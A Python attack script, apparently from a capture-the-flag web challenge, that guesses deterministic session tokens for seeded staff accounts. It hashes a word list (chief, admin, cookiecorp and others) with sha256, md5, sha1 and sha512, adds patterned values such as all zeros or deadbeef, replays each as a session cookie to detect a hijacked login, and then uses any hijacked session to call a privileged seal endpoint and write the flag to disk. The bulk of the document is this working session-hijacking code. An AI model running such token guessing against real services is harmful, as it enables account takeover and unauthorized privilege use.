#!/usr/bin/env python3
"""Have I actually tested the SESSION TOKEN space, or only random made-up tokens?

Everything about the seal reduces to one gate: the app resolves `req.cookies.session`
(64 hex chars) to a user and needs that user's DB role to be staff. Both earlier sessions
closed that gate with "unknown/made-up session tokens are never auto-created" - but what was
really sent was random hex. That is not the same test as the one that matters, because the
staff users are SEEDS created by the author, and seeded rows very often get deterministic
tokens instead of random ones: `sha256(username)`, `sha256(username:password)`, a padded or
repeated pattern, or a constant that appears in the app's own vocabulary. My own tokens are
random per login (verified), which says nothing about a row inserted by a seeder.

`/dashboard` is a clean oracle that cannot be confused: with a live token it renders
"Welcome back, <name>", otherwise the login page. So each candidate either resolves to a
user or it does not - and one hit gives me whoever that session belongs to, including the
Chief. This script also proves its own harness: it first checks a KNOWN-GOOD token (mine)
and a KNOWN-BAD one, so a silent bug in the comparison cannot produce a false "all dead".
"""
import hashlib
import re
import sys

from cc import Client, new_baker


def w(*a):
    sys.stdout.buffer.write((" ".join(str(x) for x in a) + "\n").encode("utf-8", "replace"))
    sys.stdout.flush()


WORDS = ["chief", "inspector", "robot", "cookiecorp", "CookieCorp", "admin", "the_chief",
         "head_chief", "quality_inspector", "golden", "golden_seal", "goldenseal", "flag",
         "sun", "secret", "session", "token", "baker", "staff", "internal", "mixer",
         "a better cookie for a brighter tomorrow", "brighter_tomorrow", "sector7",
         "orbital city", "1962", "tomorrow", "geo", "sunshine", "sunshinectf", "",
         "chief:chief", "inspector:inspector", "chief:cookiecorp", "cookiecorp:chief"]

CANDS = {}
for s in WORDS:
    h = s.encode()
    CANDS["sha256(%r)" % s] = hashlib.sha256(h).hexdigest()
    CANDS["sha256(u+'\\n')"] = hashlib.sha256(h + b"\n").hexdigest() if s else "x"
    CANDS["md5(%r) padded" % s] = hashlib.md5(h).hexdigest().ljust(64, "0")
    CANDS["sha512(%r)[:64]" % s] = hashlib.sha512(h).hexdigest()[:64]
    CANDS["sha1(%r) padded" % s] = hashlib.sha1(h).hexdigest().ljust(64, "0")
extra = {
    "all zero": "0" * 64,
    "all f": "f" * 64,
    "1 repeated": "1" * 64,
    "deadbeef x8": "deadbeef" * 8,
    "ab repeated": "ab" * 32,
    "63 zero + 1": "0" * 63 + "1",
    "counter 1 hex": "%064x" % 1,
    "counter 2 hex": "%064x" % 2,
    "oid-like zeros": "0" * 24 + "0" * 40,
}
CANDS.update(extra)

u, c, _ = new_baker("se")
mine = c.jar["session"]
w("own account %s, my token %s..." % (u, mine[:12]))

w("=== harness control ===")
code, dash, dt = c.get("/dashboard")
w("  with my real token : %s  welcome=%s" % (code, bool(re.search("Welcome back", dash or ""))))
code, dash, dt = c.get("/dashboard", headers={"Cookie": "session=" + "e" * 64})
w("  with random hex    : %s  welcome=%s   <- must be False" % (code, bool(re.search("Welcome back", dash or ""))))

w("=== %d derived candidates ===" % len(CANDS))
hits = []
for label, tok in CANDS.items():
    if not re.fullmatch(r"[0-9a-f]{64}", tok or ""):
        continue
    y = Client()
    code, dash, dt = y.get("/dashboard", headers={"Cookie": "session=%s; role=baker" % tok})
    welcome = re.search(r"Welcome back, ([\w-]+)", dash or "")
    if welcome:
        who = welcome.group(1)
        w("  !!! %-26s -> %s LOGGED IN AS %s" % (label, code, who))
        hits.append((label, tok, who, y))
if not hits:
    w("  none resolved to a session")

w("=== if any hit, use it on /api/seal ===")
for label, tok, who, y in hits:
    code, out, dt = y.post("/api/recipe", {"title": "as %s" % who,
                                           "ingredients": [{"name": "f", "value": "1"}]})
    rid = out.get("id") if isinstance(out, dict) else None
    w("  %s: save -> %s %s" % (who, code, str(out)[:60]))
    if rid:
        code2, out2, dt = y.post("/api/seal", {"recipeId": rid})
        w("  %s: /api/seal -> %s %s" % (who, code2, str(out2)[:120]))
        if isinstance(out2, dict) and out2.get("seal") == "chief":
            open("../flag.txt", "w", encoding="utf-8").write(str(out2) + "\n")
            w("  !!! GOLDEN %s" % out2)
